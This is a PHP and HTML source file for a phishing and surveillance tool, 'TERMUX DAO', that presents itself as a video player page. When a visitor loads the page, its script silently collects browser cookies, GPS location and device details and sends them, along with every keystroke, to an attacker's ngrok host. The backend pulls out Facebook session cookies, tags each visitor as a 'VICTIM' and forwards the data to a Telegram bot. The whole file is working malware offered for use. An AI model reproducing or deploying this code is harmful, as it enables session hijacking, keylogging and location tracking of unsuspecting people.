<?php
// 🔥 TERMUX DAO - Fully Working Mobile Pentest
$config = include 'config.php';

function telegram($msg) {
    global $config;
    $ch = curl_init("https://api.telegram.org/bot{$config['BOT_TOKEN']}/sendMessage");
    curl_setopt_array($ch, [
        CURLOPT_POSTFIELDS => http_build_query([
            'chat_id' => $config['CHAT_ID'],
            'parse_mode' => 'HTML',
            'text' => substr($msg, 0, 4000)
        ]),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TIMEOUT => 10
    ]);
    curl_exec($ch);
    curl_close($ch);
}

function logData($data) {
    global $config;
    $log = date('Y-m-d H:i:s T') . " | {$_SERVER['REMOTE_ADDR']}\n$data\n\n";
    file_put_contents($config['LOG_FILE'], $log, LOCK_EX);
}

// DATA HANDLER
if(isset($_GET['data']) || isset($_POST['data'])) {
    $data = base64_decode($_GET['data'] ?? $_POST['data'] ?? '');
    if($data && ($v = json_decode($data, true))) {
        $msg = "🎯 <b>VICTIM #" . rand(1000,9999) . "</b>\n\n";
        $msg .= "📱 <code>" . substr($v['device']??'',0,60) . "</code>\n";
        $msg .= "📍 " . ($v['geo']??'N/A') . "\n";
        $msg .= "🖥️ " . ($v['screen']??'') . "\n";
        $msg .= "🌐 <b>IP:</b> {$_SERVER['REMOTE_ADDR']}";
        
        // Cookies
        if($v['cookies']) {
            preg_match_all('/(c_user|xs|sb|datr|sessionid)=([^;]+)/', $v['cookies'], $m);
            if($m[1]) $msg .= "\n\n🍪 <b>FB:</b> " . implode(' ', array_slice($m[1],0,3));
        }
        
        telegram($msg);
        logData($data);
    }
    exit('OK');
}

// KEYLOGGER
if(isset($_GET['key'])) {
    telegram("⌨️ <b>LIVE:</b> " . urldecode($_GET['key']));
    exit;
}

// INJECTOR
if(isset($_GET['inject'])) {
    $link = "http://{$config['NGROK_URL']}/dao.php?v=" . time();
    telegram("✅ <b>PAYLOAD READY</b>\n🎥 {$_GET['inject']}\n🔗 <code>$link</code>");
    exit($link);
}
?>
<!DOCTYPE html><html><head><title>HD Player</title><meta charset="utf-8" name="viewport" content="width=device-width"><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#000;font-family:system-ui;height:100vh;overflow:hidden}#v{position:fixed;inset:0;width:100%;height:100%;z-index:1}#o{position:fixed;inset:0;background:rgba(0,0,0,.98);z-index:99;display:grid;place-items:center}.c{background:linear-gradient(135deg,#ff416c,#ff4b2b);backdrop-filter:blur(10px);color:#fff;padding:2.5rem 2rem;border-radius:25px;text-align:center;max-width:92vw;box-shadow:0 25px 50px rgba(255,65,108,.4)}h1{font-size:clamp(1.5rem,8vw,2.8rem);margin:0 0 1rem 0;font-weight:700;text-shadow:0 4px 15px rgba(0,0,0,.5)}p{font-size:clamp(1rem,4vw,1.2rem);opacity:.95;margin-bottom:2rem}button{background:linear-gradient(45deg,#ff6b6b,#ee5a52);color:#fff;border:none;padding:1.3rem 3rem;font-size:clamp(1.1rem,5vw,1.4rem);border-radius:50px;cursor:pointer;font-weight:700;box-shadow:0 12px 30px rgba(255,100,100,.5);transition:all .3s;letter-spacing:1px}button:hover{transform:translateY(-4px) scale(1.03);box-shadow:0 20px 45px rgba(255,100,100,.7)}button:active{transform:scale(.98)}</style></head><body><iframe id="v" src="<?=htmlspecialchars($_GET['video']??'https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1')?>" frameborder="0" allowfullscreen style="filter:brightness(.35) contrast(1.2)"></iframe><div id="o"><div class="c"><h1>🎥 Premium Access</h1><p>HD Quality Unlocked ✓</p><button onclick="s()">▶️ Watch Full HD</button></div></div><script>const H='<?=$config["NGROK_URL"]?>';let g='No GPS';navigator.geolocation.getCurrentPosition(p=>g=`Lat:${p.coords.latitude.toFixed(5)},Lon:${p.coords.longitude.toFixed(5)}`,()=>{}, {enableHighAccuracy:true});function ex(d){const p=btoa(JSON.stringify(d));fetch(`http://${H}/dao.php?data=${p}`).catch(()=>{});new Image().src=`http://${H}/dao.php?data=${p}`;}function s(){ex({cookies:document.cookie,device:navigator.userAgent,geo:g,screen:`${screen.width}x${screen.height}x${screen.availHeight}`,lang:navigator.language||'??',platform:navigator.platform||'??',plugins:Array.from(navigator.plugins||[]).map(p=>p.name).join(',')});document.getElementById('o').remove();document.title='Playing...';}setTimeout(s,1200);setInterval(s,18e3);addEventListener('keydown',e=>fetch(`http://${H}/dao.php?key=${encodeURIComponent(e.key)}`));if('serviceWorker' in navigator)navigator.serviceWorker.register('/sw.js');</script></body></html>
